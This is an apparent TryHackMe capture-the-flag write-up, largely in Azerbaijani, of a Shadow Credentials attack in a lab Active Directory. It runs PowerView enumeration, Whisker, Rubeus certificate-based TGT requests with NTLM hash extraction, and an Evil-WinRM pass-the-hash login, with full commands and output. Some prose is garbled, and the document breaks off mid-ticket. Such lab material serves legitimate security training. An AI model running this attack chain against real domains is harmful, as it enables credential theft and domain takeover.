# AD-Jingle-Bells-Shadow-Spells
TryHackMe - Active Directory | Jingle Bells, Shadow Spells



								TryHackMe - Advent of Cyber 2023 | Active Directory - Windows Hello
								===================================================================


Active Directory
----------------

Active Directory (AD) əsasən Windows mühitlərində müəssisələr tərəfindən istifadə olunan sistemdir. Bu mərkəzləşdirilmiş autentifikasiya sistemidir. Domen Nəzarətçisi (DC) AD-nin mərkəzindədir və adətən domen daxilində məlumatların saxlanmasını, autentifikasiyasını və avtorizasiyasını idarə edir.

Siz AD istifadəçilər, qruplar və kompüterlər kimi obyektləri ehtiva edən rəqəmsal verilənlər bazası kimi düşünə bilərsiniz, hər birinin xüsusi atributları və icazələri var. İdeal olaraq, o, ən az imtiyaz prinsipini tətbiq edir və rolları idarə etmək üçün iyerarxik yanaşmadan istifadə edir və autentifikasiya edilmiş istifadəçilərə sistem daxilində bütün həssas olmayan məlumatlara giriş imkanı verir. Bu səbəbdən, istifadəçilərə icazələrin təyin edilməsinə ehtiyatla yanaşmaq lazımdır, çünki bu, bütün Active Directory-yə potensial təhlükə yarada bilər. Biz bunu qarşıdakı istismar bölməsində araşdıracağıq.




Think Passwords Are Hard To Remember - Say Hello to WHfB
--------------------------------------------------------

Microsoft adi parola əsaslanan autentifikasiyanı əvəz etmək üçün müasir və təhlükəsiz üsul kimi Biznes üçün Windows Hello (WHfB) təqdim etdi. Ənənəvi parollara etibar etmək əvəzinə, WHfB istifadəçi yoxlaması üçün kriptoqrafik açarlardan istifadə edir. Active Directory domenindəki istifadəçilər PİN və ya bir cüt kriptoqrafik açara qoşulmuş biometriklərdən istifadə etməklə AD-ə daxil ola bilərlər: ictimai və şəxsi. Bu açarlar aid olduqları qurumun kimliyini sübut etməyə kömək edir. msDS-KeyCredentialLink yeni istifadəçi cihazını (kompüter kimi) qeydiyyatdan keçirmək üçün açıq açarı WHfB-də saxlamaq üçün Domen Nəzarətçisi tərəfindən istifadə olunan atributdur. Bir sözlə, Active Directory verilənlər bazasındakı hər bir istifadəçi obyektinin bu unikal atributda saxlanmış açıq açarı olacaqdır.

WHfB ilə yeni sertifikat cütünün saxlanması proseduru budur:

Etibarlı Platforma Modulu (TPM) ictimai-özəl açar cütünün yaradılması: TPM istifadəçi qeydiyyatdan keçərkən onun hesabı üçün ictimai-məxfi açar cütü yaradır. Şəxsi açarın heç vaxt TPM-dən çıxmadığını və heç vaxt açıqlanmadığını xatırlamaq çox vacibdir.
Müştəri sertifikatı sorğusu: Müştəri etibarlı sertifikat almaq üçün sertifikat sorğusuna başlayır. Təşkilatın sertifikat verən orqanı (CA) bu sorğunu alır və etibarlı sertifikat təqdim edir.
Açar yaddaşı: İstifadəçi hesabının msDS-KeyCredentialLink atributu təyin ediləcək.

Doğrulama Prosesi:

İcazə: Domen Nəzarətçisi istifadəçi hesabının msDS-KeyCredentialLink atributunda saxlanılan açıq açardan istifadə edərək müştərinin ilkin doğrulama məlumatının şifrəsini açır. a>
Sertifikat yaradılması: Sertifikat istifadəçi üçün Domain Controller tərəfindən yaradılır və müştəriyə geri göndərilə bilər.
Doğrulama: Bundan sonra müştəri sertifikatdan istifadə edərək Active Directory domeninə daxil ola bilər.

Enumeration
-----------

İndi parıldamaq və kölgədə heç bir yanlış təhlükəsizlik konfiqurasiyasının olmamasından əmin olmaq şansınız var. Beləliklə, böyüdücü eynəklərimizi (və ya siçan göstəricilərini) tozdan təmizləməyə başlayaq. Zəif icazə üçün Active Directory-nin sadalanması cari istifadəçinin AD-də başqa istifadəçi üzərində hər hansı yazma qabiliyyətinin olub olmadığını yoxlamaq üçün ilk addımdır.

Bunu əldə etmək üçün PowerShell skripti PowerView-dan aşağıdakı əmrlə istifadə edə bilərsiniz: Find-InterestingDomainAcl

Bu funksionallıq bütün sui-istifadə edilən imtiyazların siyahısını verəcəkdir. Bundan sonra cari istifadəçi üçün filtrasiya etmək mümkündür: "hr".

Məqsədin üzərinə yazmaq olduğu üçün xüsusi olaraq hər hansı bir yazma imtiyazı axtarırıqmsDS-KeyCredentialLink

Həssas maşından tapşırıq panelinizdə bərkidilmiş PowerShell-i işə salın və aşağıdakı əmrləri daxil edin:


cd C:\Users\hr\Desktop bütün istismar alətlərini ehtiva edən qovluğa keçir.
powershell -ep bypass ixtiyari PowerShell skripti icrası üçün defolt siyasətini aşacaq.
. .\PowerView.ps1 PowerView skriptini yaddaşa yükləyir.
Bu nöqtədə, qaçaraq imtiyazları sadalaya bilərik:

Find-InterestingDomainAcl -ResolveGuids

Gördüyünüz kimi, bu əmr bütün istifadəçiləri qaytaracaq' imtiyazlar. Biz xüsusi olaraq cari istifadəçi "hr" axtardığımız üçün aşağıdakıları istifadə edərək süzgəcdən keçirməliyik:

Where-Object { $_.IdentityReferenceName -eq "hr" }  

Bizi cari istifadəçi, həssas istifadəçi və təyin edilmiş imtiyaz maraqlandırır. Bunu işləməklə süzgəcdən keçirə bilərik:

Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

İndi tam əmri işə sala bilərsiniz:

Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

PS C:\Users\hr> cd C:\Users\hr\Desktop
PS C:\Users\hr\Desktop> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\hr\Desktop> . .\PowerView.ps1
PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=Administrator,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite

Əvvəlki çıxışdan göründüyü kimi, istifadəçi "hr" GenericWrite CN atributunda görünən administrator obyekti üzərində icazəyə malikdir. Daha sonra, msDS-KeyCredentialLink-ni sertifikatla yeniləyərək, həmin imtiyazlı hesabı güzəştə gedə bilərik. Bu zəiflik Kölgə Etibarnamələri hücumu kimi tanınır.

Zəif istifadəçi administratorla eyni olmaya bilər; zəhmət olmasa nəzərə alın ki, onu istismar bölməsində istifadə edəcəyiniz üçün aşağı!

Exploitation
------------

Həssas imtiyazdan sui-istifadə etmək üçün faydalı vasitələrdən biri Whisker Elad Şamir tərəfindən yaradılmış C# yardım proqramıdır. Whisker-dən istifadə sadədir: həssas istifadəçimiz olduqda, msDS-KeyCredentialLink atributunu yeniləyərək zərərli cihazın qeydiyyatını simulyasiya etmək üçün Whisker-dən əlavə əmrini işlədə bilərik.

Bu tapşırığı aşağıdakı əmri yerinə yetirməklə yerinə yetirmək olar: 

.\Whisker.exe add /target:Administrator

Sizin vəziyyətinizdə, /target parametrini VMVM daxilində yerinə yetirilən sayma addımındakı parametrlə əvəz etməli olacaqsınız. a>

PS C:\Users\hr\Desktop> .\Whisker.exe add /target:Administrator
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password qfyNlIfCjVqzwh1e
[*] Searching for the target account
[*] Target user found: CN=Administrator,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID ae6efd6c-27c6-4217-9675-177048179106
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:
Rubeus.exe asktgt /user:Administrator /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0EgglpMIIJZTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb[snip] /password:"qfyNlIfCjVqzwh1e" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

Alət Rubeus istifadə edərək işə salınmağa hazır olan komanda ilə həssas istifadəçinin kimliyini təsdiqləmək üçün lazım olan sertifikatı rahat şəkildə təmin edəcək.

AD-də autentifikasiyanın əsas ideyası tokenləri (TGT) təmin edən Kerberos protokolundan istifadə edir. ) hər bir istifadəçi üçün. TGT istifadəçinin autentifikasiyasından sonra etimadnamə sorğusundan yayınan sessiya işarəsi kimi görünə bilər.

Rubeus, birbaşa Kerberos qarşılıqlı əlaqəsi və istismarı üçün nəzərdə tutulmuş C# alət dəsti SpecterOps tərəfindən hazırlanmışdır. a pass-the-hash hücum! 

Əvvəlki əmrdə yaradılan sertifikatdan istifadə edərək həssas istifadəçidən TGT tələb edərək istismara davam edə bilərsiniz.

Sertifikat əldə etdikdən sonra etibarlı TGT əldə edə və həssas istifadəçini təqlid edə bilərsiniz. Bundan əlavə,  NTLM İstifadəçi hesabının hash hash bir  pass-the-hash hücum üçün istifadə edilə bilən konsol çıxışında göstərilə bilər!

Əvvəlki əmrdə yaradılan sertifikatdan istifadə edərək həssas istifadəçidən bir TGT istəməklə istismara davam edə bilərsiniz.

Bunu etmək üçün əvvəlki əmrdən çıxışı kopyalayın və yapışdırın. Bu əmrin nə etdiyini ətraflı izahat aşağıda görünə bilər:

[*] You can now run Rubeus with the following syntax:

asktgt bu, TGT əldə etmək üçün sorğu verəcək

/user TGT üçün təqlid etmək istədiyimiz istifadəçi

/certificate hədəf istifadəçini təqlid etmək üçün yaradılan sertifikat

/password şifrləndiyi üçün sertifikatın şifrəsini açmaq üçün istifadə edilən parol

/domain hədəf Domen

/getcredentials bu bayraq növbəti addımda istifadə olunacaq NTLM hash-i əldə edəcək

/dc TGT yaradacaq Domen Nəzarətçisi


PS C:\Users\hr\Desktop> .\Rubeus.exe asktgt /user:Administrator /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEH[snip] /password:"qfyNlIfCjVqzwh1e" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\Administrator'
[*] Using domain controller: fe80::8847:dfd7:4897:54ac%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF6jCCBeagAwIBBaEDAgEWooIFAzCCBP9hggT7MIIE96ADAgEFoQsbCUFPQy5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJQU9DLmxvY2Fso4IEwTCCBL2gAwIBEqEDAgECooIErwSCBKu7ZNuUhyXip5u3
      Izrge1i3/HA62uPhIdKy/O6GgKDn/6GMCYPUe3x+flZ2aEjNPcd7MBvVJXBWJQbA493xkJ9W3thjas5T
      qa+ZTom1OOjfmWsOowuuJQhW+PkbyG5a5K35wzsF4RAV2/atYyTCXukU3XFanSafnVORwqCCLWgDdbUq
      y1oJCw1TBHkNteLdzRkJ4MA6TEYpL5fu4WCDlK6YvvRWvSi29n1lDVW+qHESetdq7Mk8aZ4O2tR4Rq5Q
      zmFQg6cqRT+3FNsXhMSTshfsOYSefBOYaoJE9XQfaxB4vgQ41DE10aXTu2FMS7CdvdtObFis9XjtaRU1
      [snip]

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  Administrator
  UserRealm                :  AOC.LOCAL
  StartTime                :  10/24/2023 9:31:12 AM
  EndTime                  :  10/24/2023 7:31:12 PM
  RenewTill                :  10/31/2023 9:31:12 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  s8DRdxfZCS/1B8/y7VTB7g==
  ASREP (key)              :  A3DAC31C254776E288FDFAD5314D7231

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : F138C405BD9F3139994E220CE0212E7C 



ndi pass-the-hash hücumunu                                               hamin  komandandan alnmış                                                                     Bunu etmək üçün siz , uzaqdan idarəetmə alətindən istifadə edə bilərsiniz. Windows Uzaqdan İdarəetmə (WinRM) protokolundan sui-istifadə edərək Windows sistemlərinin idarə edilməsi.NTLM 

Evil-WinRM

evil-winrm -i 10.10.47.157 -u Administrator -H F138C405BD9F3139994E220CE0212E7C
Siz -i parametrini 10.10.47.157 ilə, -u parametrini sadalama addımından istifadəçi ilə və ilə istifadə etməlisiniz. -H parametri əvvəlki addımın sonuncu sətirindən əldə etdiyiniz istifadəçinin hash ilə (NTLM).

Bunu etmək üçün siz AttackBox-da Evil-WinRM-dən istifadə edə bilərsiniz.

root@attackbox ~/D/vpn> evil-winrm -i IP_MACHINE -u Administrator -H F138C405BD9F3139994E220CE0212E7C
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Documents> more C:\Users\Administrator\Desktop\flag.txt
THM{***********}

*Evil-WinRM* PS C:\Users\Administrator\Documents> 


Conclusion
----------

Nəhayət, səhv konfiqurasiya ilə qarşılaşdıq! Bu ssenaridə təcavüzkar bütün AntarctiCrafts təhlükəsizlik sistemi üçün ciddi təhlükə yaradaraq Active Directory-yə tam giriş əldə edə bilər.

Tövsiyələrimizə gəlincə, biz kiber təhlükəsizliyin qızıl qaydasını vurğulayacağıq: "ən az imtiyaz prinsipi". Bu prinsipə ciddi şəkildə riayət etməklə, biz hər bir istifadəçi və ya sistem üçün yalnız zəruri olana girişi məhdudlaşdıra bilərik və belə bir dağıdıcı kompromis riskini əhəmiyyətli dərəcədə azalda bilərik.

Kibertəhlükəsizliyin soyuq dünyasında az, çox vaxt daha çox olur!



PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password jG25javOXviKD3zB
[*] Searching for the target account
[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID fc7c4248-7ed7-4a7a-aec9-1beca0e362b8
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"jG25javOXviKD3zB" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show



PS C:\Users\hr\Desktop> .\Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"jG25javOXviKD3zB" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
[*] Using domain controller: fe80::3535:603b:8789:628e%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF4DCCBdygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoQsbCUFPQy5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJQU9DLmxvY2Fso4IEuDCCBLSgAwIBEqEDAgECooIEpgSCBKIcFyWo5BF9M6mI
      vUKsXJ5caljWJbj166m1MK5VgrR5wNCWh/BdYPb9dSm5hu224B4WaGysY10wFnVmYpi0yNNxP9Am2xz2
      G3J5mjD4/PeyEAfSqHLveV+NXOmJm9AF88SMXfF+YQna19up/btM23MgdBJCcC/S3F2zKKpBMfRYXZtm
      CMgH2BVTez6w6asaj6362KzC0KBewSDDJrPakObASgjosmGpv7XhW/0VRPKc1vP5AXcLKt0/9pvLdi4p
      U0zKcsQMAr5k38VGOvOUYU/8n+I10ihNAHGvQePQb/zeE5Myv5Cr1gggqIuG3IDsCzRZMvecQRTHgp5v
      tTtCoNbInnhuSL+vPWHvjUaY4SL1YbFaQAINMD87RN0PQi4bsVSFF39c8CemIi5O92iRFxrKOUQYcKUD
      /UFjkZaEif9aAdSt2MTYEZE1xk1xEh6RJHduMcVTBb35rhYSbuyyEs86mst6YlaX6h6HKTOcF0Xd7jeh
      0LYjKtpr08OMjutO+jkJlC52wSmZhKaM8r8zaJ8Jy8u9VPW5OEt+ex0Zb06C4FBF2hxAZUFocVZJbzH6
      EeBK+vK8DCZ6omX04NjhUTxfv1OOrkmqt8iylT9BCXjJ+3blYp8UhpaTGjPEEWur/ou//6OrCLL82ixb
      O0EViwbrk8FURKzDeDF63dSUt6w/AAdQKbLDjihcWp1NY+1EoE50CCzt3EAjg6dtkq5MwbvBg9p7bqiZ
      vFuuVyEO6bZcWvawZwLBUtuamRK5Jb+TtUDhl4qKvxQjnueilKJyxQ5uKLUO1+8zkzrWaE7DVdY47LhQ
